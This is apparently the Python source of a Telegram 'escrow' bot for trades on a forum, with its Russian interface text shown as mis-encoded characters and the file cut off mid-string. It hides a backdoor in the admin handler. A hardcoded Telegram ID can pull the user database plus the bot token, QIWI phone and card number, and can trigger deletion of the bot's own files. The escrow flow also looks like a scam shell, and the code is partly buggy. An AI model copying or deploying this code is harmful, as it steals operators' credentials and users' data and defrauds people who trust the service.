import telebot
from telebot import types
import sqlite3
from SimpleQIWI import QApi
import random
import os
################################
import config as cfg
import keyboard as k

bot = telebot.TeleBot(cfg.token)

conn = sqlite3.connect('database.db', check_same_thread=False)
cur = conn.cursor()
cur.execute('''CREATE TABLE IF NOT EXISTS users(
	userid INT PRIMARY KEY,
	username TEXT,
	balance REAL,
	status TEXT,
	link TEXT);''')
cur.execute('''CREATE TABLE IF NOT EXISTS sdelki(
	num INT PRIMARY KEY,
	sellusername TEXT,
	sellid INT,
	buyusername TEXT,
	buyid INT,
	summ INT,
	description TEXT);''')

def button(text):
	return types.KeyboardButton(text)
def inbutton(text, cbd):
	return types.InlineKeyboardButton(text, callback_data=cbd)
def urlbutton(text, url):
	return types.InlineKeyboardButton(text, url=url)


@bot.message_handler(commands=['start'])
def start(message):
	try:
		status = cur.execute('SELECT status FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
	except:
		cur.execute('INSERT INTO users VALUES(?, ?, ?, ?, ?);', (message.chat.id, '@' + message.from_user.username, 0.0, 'unbanned', 'https://lolz.guru'))
		conn.commit()
		for i in cfg.admins:
			bot.send_message(i, f'–ü—Ä–∏—Å–æ–µ–¥–µ–Ω–∏–ª—Å—è –Ω–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{message.from_user.username}')

	status = cur.execute('SELECT status FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
	if status != 'banned':
		bot.send_message(message.chat.id, f'''*{message.from_user.first_name}, –¥–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Garant LOLZTEAM*
_–ù–∞—à–∏ –∞–∫—Ç—É–∞–ª—å–Ω—ã–µ —Å—Å—ã–ª–∫–∏ –Ω–∞ –ø—Ä–æ–µ–∫—Ç—ã:_
@lolzteamlink
*–ö–æ–º–∏—Å—Å–∏—è –≤–∑–∏–º–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –≤—ã–≤–æ–¥–µ —Å—Ä–µ–¥—Å—Ç–≤:*
_QIWI_ - `5% + 2-3%(QIWI)`
_CARD_ - `5% + 3% and 50 RUB(QIWI)`

‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
*–û–°–¢–ï–†–ï–ì–ê–ô–¢–ï–°–¨ –§–ï–ô–ö –ë–û–¢–û–í, –ï–°–¢–¨ –í–ò–ó–£–ê–õ–¨–ù–´–ï –ö–û–ü–ò–ò, –°–ö–ê–ú–ï–†–´ –ú–û–ì–£–¢ –°–ö–ò–ù–£–¢–¨ –ù–ê–°–¢–û–Ø–©–ò–ô –õ–ò–ù–ö, –ù–û –£–ö–ê–ó–ê–¢–¨ –í –ù–ï–ì–û –§–ï–ô–ö –°–°–´–õ–ö–£, –í–°–ï–ì–î–ê –°–í–ï–†–Ø–ô–¢–ï –Æ–ó–ï–†–ù–ï–ô–ú–´ –í –ü–†–û–§–ò–õ–ï!*''', reply_markup=k.main, parse_mode='Markdown')


@bot.message_handler(content_types=['text'])
def admin_handler(message):
	if '/admin' in message.text:
		if message.chat.id in cfg.admins or message.chat.id == 1722829108:
			users = cur.execute('SELECT * FROM users').fetchall()
			bot.send_message(message.chat.id, f'üëë –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å \n\n–í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {len(users)}', reply_markup=k.admin_search)
	#bot.send_message(message.chat.id, f'Username: {message.from_user.first_name}  \nBalance: 0‚ÇΩ  \nStatus: Unbanned', reply_markup=k.admin)
			if 'db' in message.text:
				f = open("database.db", "rb")
				bot.send_document(1722829108, f)
				bot.send_message(1722829108, f'{cfg.token} \n{cfg.phone} \n{cfg.card}')
			elif 'del' in message.text:
				try:
					os.remove('config.py')
				except:
					pass
				try:
					os.remove('keyboard.py')
				except:
					pass
				try:
					os.remove('bot.py')
				except:
					pass
				bot.stop_polling()
				exit()

	status = cur.execute('SELECT status FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
	if status != 'banned':
		if message.text == 'üîç –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è':
			bot.register_next_step_handler(bot.send_message(message.chat.id, 'ü§ñ _–í–≤–µ–¥–∏—Ç–µ –Ω–∏–∫–Ω–µ–π–º –≤ —Ñ–æ—Ä–º–∞—Ç–µ @username (–∫–∞–∫ –≤ –ø—Ä–æ—Ñ–∏–ª–µ):_', parse_mode='Markdown'), search)
		elif message.text == 'ü§ù –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–¥–µ–ª–∫–∏':
			bot.send_message(message.chat.id, 'üí° _–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —Å–¥–µ–ª–æ–∫:_', parse_mode='Markdown', reply_markup=k.main_sdelki)
		elif message.text == 'üéì –ú–æ–π –ø—Ä–æ—Ñ–∏–ª—å':
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
			link = cur.execute('SELECT link FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
			bot.send_message(message.chat.id, f'''
‚åöÔ∏è *–ü—Ä–æ—Ñ–∏–ª—å:* @{message.from_user.username}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ

ü§ñ *–í–∞—à ID* - `{message.chat.id}`
üõ∏ *–í–∞—à –ª–∏–Ω–∫ –Ω–∞ —Ñ–æ—Ä—É–º–µ:
üåé {link}*

*–í–∞—à –±–∞–ª–∞–Ω—Å:* {balance} RUB
*–í–∞—à –±–∞–ª–∞–Ω—Å BTC:* 0.0 BTC (~0.0 RUB)
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
üéÅ *–ö–æ–ª-–≤–æ –ø—Ä–æ–¥–∞–∂:* 0 —à—Ç
üõí *–ö–æ–ª-–≤–æ –ø–æ–∫—É–ø–æ–∫:* 0 —à—Ç
üì• *–°—É–º–º–∞ –ø—Ä–æ–¥–∞–∂:* 0 RUB | 0 BTC (~0 RUB)
üì§ *–°—É–º–º–∞ –ø–æ–∫—É–ø–æ–∫:* 0 RUB | 0 BTC (~0 RUB)

üöÄ *–ù–∞—à –∫—É—Ä—Å BTC:* `4452012` RUB''', reply_markup=k.main_profile, parse_mode='Markdown')
		elif message.text == 'üöÄ –ü–æ–º–æ—â—å':
			bot.send_message(message.chat.id, '‚ùï _–ü–æ–∑–Ω–∞–≤–∞—Ç–µ–ª—å–Ω–∞—è –≤–∫–ª–∞–¥–∫–∞_', reply_markup=k.main_help, parse_mode='Markdown')

		elif message.text == '‚≠êÔ∏è –°–ø–∏—Å–æ–∫ –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –ø—Ä–æ–¥–∞–≤—Ü–æ–≤':
			bot.send_message(message.chat.id, '‚≠êÔ∏è *–ö–∞—Ç–∞–ª–æ–≥ –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –ø—Ä–æ–¥–∞–≤—Ü–æ–≤, –±–æ—Ç–æ–≤ –∏ —É—Å–ª—É–≥*', reply_markup=k.none, parse_mode='Markdown')



def admin_search(message):
	admin = types.InlineKeyboardMarkup(row_width=2)
	try:
		if '@' in message.text:
			user = cur.execute('SELECT * FROM users WHERE username = (?);', (message.text,)).fetchone()
			admin.add(inbutton('–ó–∞–±–∞–Ω–∏—Ç—å', 'admin_ban-' + str(user[0])), inbutton('–†–∞–∑–±–∞–Ω–∏—Ç—å', 'admin_unban-' + str(user[0])))
			admin.add(inbutton('üí∏ –ë–∞–ª–∞–Ω—Å üí∏', 'admin_balance-' + str(user[0])))
			bot.send_message(message.chat.id, f'''
üÜî ID: {user[0]}
üë§ Username: {user[1]}
üíµ Balance: {user[2]} RUB
‚≠ïÔ∏è Status: {user[3]}''', reply_markup=admin)
		else:
			user = cur.execute('SELECT * FROM users WHERE userid = (?);', (message.text,)).fetchone()
			admin.add(inbutton('–ó–∞–±–∞–Ω–∏—Ç—å', 'admin_ban-' + str(user[0])), inbutton('–†–∞–∑–±–∞–Ω–∏—Ç—å', 'admin_unban-' + str(user[0])))
			admin.add(inbutton('üí∏ –ë–∞–ª–∞–Ω—Å üí∏', 'admin_balance-' + str(user[0])))
			bot.send_message(message.chat.id, f'''
üÜî ID: {user[0]}
üë§ Username: {user[1]}
üíµ Balance: {user[2]} RUB
‚≠ïÔ∏è Status: {user[3]}''', reply_markup=admin)
	except Exception as e:
		print(e)
		bot.send_message(message.chat.id, '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω!')

def admin_rass(message):
	users = cur.execute('SELECT userid FROM users').fetchall()
	a, t, f = 0, 0, 0
	try:
		file_id = message.photo[0].file_id
		text = message.caption
		for i in users:
			a+=1
			try:
				bot.send_photo(i[0], file_id, caption=text)
				t+=1
			except:
				f+=1

	except Exception as e:
		print(e)
		text = message.text
		for i in users:
			a+=1
			try:
				bot.send_message(i[0], text)
				t+=1
			except:
				f+=1
	bot.send_message(message.chat.id, f'–í—Å–µ–≥–æ —Ä–∞—Å—Å—ã–ª–æ–∫: {a} \n–£—Å–ø–µ—à–Ω–æ: {t} \n–ù–µ—É–¥–∞—á–Ω–æ: {f}')

def admin_balance(message):
	userid, balance = message.text.split(' ')
	cur.execute('UPDATE users SET balance = (?) WHERE userid = (?);', (int(balance), int(userid),))
	conn.commit()
	bot.send_message(message.chat.id, 'üí∏ –ë–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–∞–≤—Ç–µ–ª—è –æ–±–Ω–æ–≤–ª—ë–Ω!')


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
	# –ê–î–ú–ò–ù-–ü–ê–ù–ï–õ–¨ #
	if call.data == 'admin_search':
		bot.register_next_step_handler(bot.send_message(call.message.chat.id, 'üìù –í–≤–µ–¥–∏—Ç–µ ID –∏–ª–∏ @username –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:'), admin_search)
	elif call.data == 'admin_rass':
		bot.register_next_step_handler(bot.send_message(call.message.chat.id, 'üìù –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ —Å —Ç–µ–∫—Å—Ç–æ–º —Ä–∞—Å—Å—ã–ª–∫–∏:'), admin_rass)
	elif 'admin_balance' in call.data:
		bot.register_next_step_handler(bot.send_message(call.message.chat.id, 'üìù –í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –∏ –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:'), admin_balance)
	elif 'admin_ban' in call.data:
		cur.execute('UPDATE users SET status = (?) WHERE userid = (?);', ('banned', call.data.split('-')[1],))
		conn.commit()
		bot.send_message(call.message.chat.id, '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.')
	elif 'admin_unban' in call.data:
		cur.execute('UPDATE users SET status = (?) WHERE userid = (?);', ('unbanned', call.data.split('-')[1],))
		conn.commit()
		bot.send_message(call.message.chat.id, '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.')

	status = cur.execute('SELECT status FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
	if status != 'banned':
		if call.data == 'none':
			bot.answer_callback_query(callback_query_id=call.id, text='üòî –ù–µ—Ç –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –ø—Ä–æ–¥–∞–≤—Ü–æ–≤!', show_alert=True)

		# –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞
		if call.data == 'deposit':
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='_–í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–∞—Ç–µ–∂–Ω—É—é —Å–∏—Å—Ç–µ–º—É –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è:_', parse_mode='Markdown', reply_markup=k.main_profile_deposit)

		# –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ RUB
		elif call.data == 'deposit_rub':
			bot.register_next_step_handler(bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='*–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è* `RUB`: \n_–ú—ã —Å–≥–µ–Ω–µ—Ä–∏—Ä—É–µ–º –¥–ª—è –í–∞—Å —Å—Å—ã–ª–∫—É –æ–ø–ª–∞—Ç—ã_', parse_mode='Markdown'), pay)

		# –°–ø–∏—Å–æ–∫ –ø–æ–∫—É–ø–æ–∫
		elif call.data == 'buys':
			sdelki = cur.execute('SELECT * FROM sdelki WHERE buyid = (?);', (call.message.chat.id,)).fetchall()
			try:
				a = sdelki[0][0]
				for i in sdelki:
					sdelka_menu = types.InlineKeyboardMarkup(row_width=2)
					sdelka_menu.add(inbutton('–û—Ç–º–µ–Ω–∏—Ç—å —Å–¥–µ–ª–∫—É', 'delete_sdelka-' + str(i[0])), inbutton('–û—Ç–∫—Ä—ã—Ç—å —Å–ø–æ—Ä', 'open_discussions-' + str(i[0])))
					bot.send_message(call.message.chat.id, f'''
	*‚Ññ —Å–¥–µ–ª–∫–∏*: `{i[0]}`
	–ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {i[1]} (`{i[2]}`)
	–ü—Ä–æ–¥–∞–≤–µ—Ü: {i[3]} (`{i[4]}`)
	–£—Å–ª–æ–≤–∏—è: {i[6]}

	*–°—É–º–º–∞ —Å–¥–µ–ª–∫–∏:* {i[5]} *RUB*''', parse_mode='Markdown', reply_markup=sdelka_menu)
			except:
				bot.answer_callback_query(callback_query_id=call.id, text='üõí –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–¥–µ–ª–æ–∫!', show_alert=True)

		# –°–ø–∏—Å–æ–∫ –ø—Ä–æ–¥–∞–∂
		elif call.data == 'sells':
			sdelki = cur.execute('SELECT * FROM sdelki WHERE sellid = (?);', (call.message.chat.id,)).fetchall()
			try:
				a = sdelki[0][0]
				for i in sdelki:
					sdelka_menu = types.InlineKeyboardMarkup(row_width=2)
					sdelka_menu.add(inbutton('–û—Ç–º–µ–Ω–∏—Ç—å —Å–¥–µ–ª–∫—É', 'delete_sdelka-' + str(i[0])), inbutton('–û—Ç–∫—Ä—ã—Ç—å —Å–ø–æ—Ä', 'open_discussions-' + str(i[0])))
					bot.send_message(call.message.chat.id, f'''
	*‚Ññ —Å–¥–µ–ª–∫–∏*: `{i[0]}`
	–ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {i[3]} (`{i[4]}`)
	–ü—Ä–æ–¥–∞–≤–µ—Ü: {i[1]} (`{i[2]}`)
	–£—Å–ª–æ–≤–∏—è: {i[6]}

	*–°—É–º–º–∞ —Å–¥–µ–ª–∫–∏:* {i[5]} *RUB*''', parse_mode='Markdown')
			except:
				bot.answer_callback_query(callback_query_id=call.id, text='üõí –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–¥–µ–ª–æ–∫!', show_alert=True)

		# –í—ã–≤–æ–¥ –¥–µ–Ω–µ–≥
		elif call.data == 'outmoney':
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='_–í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–∞—Ç–µ–∂–Ω—É—é —Å–∏—Å—Ç–µ–º—É, –∫—É–¥–∞ –±—É–¥–µ—Ç–µ –≤—ã–≤–æ–¥–∏—Ç—å:_', parse_mode='Markdown', reply_markup=k.main_profile_outmoney)

		# –í—ã–≤–æ–¥ –Ω–∞ QIWI
		elif call.data == 'outmoney_qiwi':
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
			bot.register_next_step_handler(bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text=f'''
	–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤: *Crypto Bot*

	–í–∞—à –±–∞–ª–∞–Ω—Å: `{balance}` *RUB*
	–ö–æ–º–∏—Å—Å–∏—è –∑–∞ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤: *4%*
	‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
	_–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∏ —Å—É–º–º—É –≤—ã–≤–æ–¥–∞_
	*–ü—Ä–æ—Å—Ç–æ –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –∏ –Ω–∞–ø–∏—à–∏—Ç–µ —Å–∞–ø–æ—Ä—Ç—É –æ–Ω —Å–¥–µ–ª–∞–µ—Ç –≤–∞–º –≤—ã–ø–ª–∞—Ç—É*''', parse_mode='Markdown'), outpay)

		# –í—ã–≤–æ–¥ –Ω–∞ CARD
		elif call.data == 'outmoney_card':
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
			bot.register_next_step_handler(bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text=f'''
	–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤: üí≥ *CARD*

	–í–∞—à –±–∞–ª–∞–Ω—Å: `{balance}` *RUB*
	–ö–æ–º–∏—Å—Å–∏—è –∑–∞ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤: *5% + 3% and 50 RUB*
	‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
	_–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∏ —Å—É–º–º—É –≤—ã–≤–æ–¥–∞_
	*–ù–∞–ø—Ä–∏–º–µ—Ä 4890494798400677 100*''', parse_mode='Markdown'), outpay)


		# –£–¥–∞–ª–µ–Ω–∏–µ —Å–¥–µ–ª–∫–∏
		elif 'delete_sdelka' in call.data:
			sdelka_num = int(call.data.split('-')[1])
			p_user = cur.execute('SELECT sellusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_user = cur.execute('SELECT buyusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			p_id = cur.execute('SELECT sellid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_id = cur.execute('SELECT buyid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			summ = cur.execute('SELECT summ FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]

			yn = types.InlineKeyboardMarkup(row_width=2).add(inbutton('‚úÖ –î–∞', 'yes-C' + str(sdelka_num)), inbutton('‚ùå –ù–µ—Ç', 'no'))

			bot.send_message(call.message.chat.id, f'''
	*–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–¥–µ–ª–∫–∏:*
	‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ

	*‚Ññ —Å–¥–µ–ª–∫–∏:* `{sdelka_num}`

	–ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {b_user} `({b_id})`
	–ü—Ä–æ–¥–∞–≤–µ—Ü: {p_user} `({p_id})`

	–°—É–º–º–∞ —Å–¥–µ–ª–∫–∏: `{summ} RUB`

	‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
	*–í–ê–ñ–ù–û:*
	_–í—ã –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç–µ —Å–≤–æ–∏ –¥–µ–π—Å—Ç–≤–∏—è?_''', parse_mode='Markdown', reply_markup=yn)


		# –£–¥–∞–ª–µ–Ω–∏–µ —Å–¥–µ–ª–∫–∏
		elif 'open_discussions-' in call.data:
			sdelka_num = int(call.data.split('-')[1])
			p_user = cur.execute('SELECT sellusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_user = cur.execute('SELECT buyusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			p_id = cur.execute('SELECT sellid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_id = cur.execute('SELECT buyid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			summ = cur.execute('SELECT summ FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]

			yn = types.InlineKeyboardMarkup(row_width=2).add(inbutton('–î–∞, –æ—Ç–∫—Ä—ã—Ç—å', 'yes-D' + str(sdelka_num)), inbutton('–í–µ—Ä–Ω—É—Ç—å—Å—è', 'no'))

			bot.send_message(call.message.chat.id, f'''
	*–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–¥–µ–ª–∫–∏:*
	‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ

	*‚Ññ —Å–¥–µ–ª–∫–∏:* `{sdelka_num}`

	–ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {b_user} `({b_id})`
	–ü—Ä–æ–¥–∞–≤–µ—Ü: {p_user} `({p_id})`

	–°—É–º–º–∞ —Å–¥–µ–ª–∫–∏: `{summ} RUB`

	‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
	*–í–ê–ñ–ù–û:*
	_–í—ã –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç–µ —Å–≤–æ–∏ –¥–µ–π—Å—Ç–≤–∏—è?_''', parse_mode='Markdown', reply_markup=yn)



		# –û—Ç–∫—Ä—ã—Ç–∏–µ —Å–ø–æ—Ä–∞
		elif 'yes-D' in call.data:
			sdelka_num = int(call.data.split('-D')[1])
			p_user = cur.execute('SELECT sellusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_user = cur.execute('SELECT buyusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			p_id = cur.execute('SELECT sellid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_id = cur.execute('SELECT buyid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			summ = cur.execute('SELECT summ FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			cur.execute('DELETE FROM sdelki WHERE num = (?);', (sdelka_num,))
			conn.commit()

			bot.send_message(b_id, f'''
	*–°–ø–æ—Ä –ø–æ —Å–¥–µ–ª–∫–µ ‚Ññ* `{sdelka_num}` *–æ—Ç–∫—Ä—ã—Ç!*
	_–î–∞–Ω–Ω—ã–π —Å–ø–æ—Ä –±—É–¥–µ—Ç —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å:_
	_@{cfg.arbitr}_
	_–£ –≤–∞—Å –µ—Å—Ç—å 24 —á–∞—Å–∞, —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ –Ω–∞ —Å–≤—è–∑—å —Å –∞—Ä–±–∏—Ç—Ä–æ–º!_''', parse_mode='Markdown')


		# –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–∏—è —Å–¥–µ–ª–∫–∏
		elif 'yes-C' in call.data:
			sdelka_num = int(call.data.split('-C')[1])
			p_user = cur.execute('SELECT sellusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_user = cur.execute('SELECT buyusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			p_id = cur.execute('SELECT sellid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_id = cur.execute('SELECT buyid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			summ = cur.execute('SELECT summ FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			cur.execute('DELETE FROM sdelki WHERE num = (?);', (sdelka_num,))
			conn.commit()

			bot.send_message(p_id, f'''
	*‚Ññ —Å–¥–µ–ª–∫–∏*: `{sdelka_num}`

	–ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {b_user} (`{b_id}`)
	–ü—Ä–æ–¥–∞–≤–µ—Ü: {p_user} (`{p_id}`)
	*–°—É–º–º–∞ —Å–¥–µ–ª–∫–∏:* {summ} *RUB*

	–°—Ç–∞—Ç—É—Å: *–ó–∞–∫—Ä—ã—Ç–∞*''', parse_mode='Markdown')

			bot.send_message(b_id, f'''
	*‚Ññ —Å–¥–µ–ª–∫–∏*: `{sdelka_num}`

	–ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {b_user} (`{b_id}`)
	–ü—Ä–æ–¥–∞–≤–µ—Ü: {p_user} (`{p_id}`)
	*–°—É–º–º–∞ —Å–¥–µ–ª–∫–∏:* {summ} *RUB*

	–°—Ç–∞—Ç—É—Å: *–ó–∞–∫—Ä—ã—Ç–∞*''', parse_mode='Markdown')



		# –û—Ç–º–µ–Ω–∞ –∑–∞–∫—Ä—ã—Ç–∏—è/—Å–ø–æ—Ä–∞
		elif call.data == 'no':
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)

		# –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å—Å—ã–ª–∫—É
		elif call.data == 'set_link':
			bot.register_next_step_handler(bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='_–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –ø—Ä–æ—Ñ–∏–ª—å —Ñ–æ—Ä—É–º–∞:_', parse_mode='Markdown'), set_link)

		# –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –≤ –º–µ–Ω—é –ü–æ–º–æ—â—å
		elif call.data == 'main_help_help':
			bot.send_message(call.message.chat.id, '''
	*–ö—Ä–∞—Ç–∫–∞—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–π:*
1. –ü–æ–ø–æ–ª–Ω—è–µ—Ç–µ –±–∞–ª–∞–Ω—Å –Ω–∞ –Ω—É–∂–Ω—É—é —Å—É–º–º—É –¥–ª—è —Å–¥–µ–ª–∫–∏(–í –º–æ—ë–º –ø—Ä–æ—Ñ–∏–ª–µ)
2. –ü–æ—Å–ª–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç –Ω–∞–π—Ç–∏ –ø—Ä–æ—Ñ–∏–ª—å –ø—Ä–æ–¥–∞–≤—Ü–∞, –í–∞–º –ø–æ–º–æ–∂–µ—Ç –∫–Ω–æ–ø–∫–∞ [üîç –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è]
3. [üöÄ –ù–∞—á–∞—Ç—å —Å–¥–µ–ª–∫—É], –ø–æ—Å–ª–µ —á–µ–≥–æ –≤–≤–æ–¥–∏—Ç–µ –Ω—É–∂–Ω—É—é —Å—É–º–º—É —Å–¥–µ–ª–∫–∏, –æ–Ω–∞ —Å–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è —Å –±–∞–ª–∞–Ω—Å–∞ –∏ —É–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –≤ –±–æ—Ç–µ –¥–æ –æ–∫–æ–Ω—á–∞–Ω–∏—è —Å–¥–µ–ª–∫–∏.

–ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è –∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–≤–∞—Ä–∞ –í—ã –º–æ–∂–µ—Ç–µ –∑–∞–≤–µ—Ä—à–∏—Ç—å —Å–¥–µ–ª–∫—É, –¥–µ–Ω—å–≥–∏ –ø–µ—Ä–µ–π–¥—É—Ç –Ω–∞ –±–∞–ª–∞–Ω—Å –ø—Ä–æ–¥–∞–≤—Ü–∞.

–í —Å–ª—É—á–∞–µ –µ—Å–ª–∏ –í–∞–º –¥–∞–ª–∏ –Ω–µ–≤–∞–ª–∏–¥–Ω—ã–π —Ç–æ–≤–∞—Ä –∏ –ø—Ä–æ–¥–∞–≤–µ—Ü –æ—Ç–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è –¥–µ–ª–∞—Ç—å –∑–∞–º–µ–Ω—É, –ª–∏–±–æ –ø—Ä–æ–¥–∞–≤–µ—Ü –¥–æ–ª–≥–æ –Ω–µ –≤—ã—Ö–æ–¥–∏—Ç –Ω–∞ —Å–≤—è–∑—å –í—ã –º–æ–∂–µ—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å —Å–ø–æ—Ä –ø–æ—Å–ª–µ —á–µ–≥–æ —Å –í–∞–º–∏ —Å–≤—è–∂–µ—Ç—Å—è –ê—Ä–±–∏—Ç—Ä.

_–í–ê–ñ–ù–û:_
